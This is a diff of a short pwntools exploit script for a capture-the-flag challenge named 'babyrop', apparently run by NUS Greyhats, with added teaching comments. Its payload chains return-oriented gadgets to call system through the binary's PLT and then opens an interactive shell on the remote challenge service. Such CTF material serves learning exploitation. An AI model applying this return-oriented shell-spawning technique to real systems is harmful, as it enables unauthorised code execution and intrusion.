@@ -1,15 +1,26 @@
+# pwntools is a very powerful library for doing exploitation
 from pwn import *
 
-babyrop = ELF('./babyrop')
+# update with actual values
+HOST = "challs1.nusgreyhats.org"
+PORT = 5012
+BINARY = "./babyrop"
+BABYROP = ELF('./babyrop')
 
-payload = p64(0x0000000000400486) * 8 + \
+PAYLOAD = p64(0x0000000000400486) * 8 + \
     p64(0x0000000000400683) + \
     p64(0x004006a4) + \
-    p64(babyrop.plt['system'])
+    p64(BABYROP.plt['system'])
 
-r = process('./babyrop')
-# r = remote('challs1.nusgreyhats.org', 5012)
+# . to open a connection to the remote service, aka the challenge
+r = remote(HOST, PORT)  
+# . use process instead of remote to execute the local version of the program
+# r = process(BINARY)   
+pause()
 
-#r.recvuntil("My favorite shell is")
-r.sendline(payload)
+# TODO: Fill in your payload
+r.sendline(PAYLOAD)
+
+# earlier, the script helps us send/receive data to/from the service
+# with interactive, we can directly interact with the service
 r.interactive()
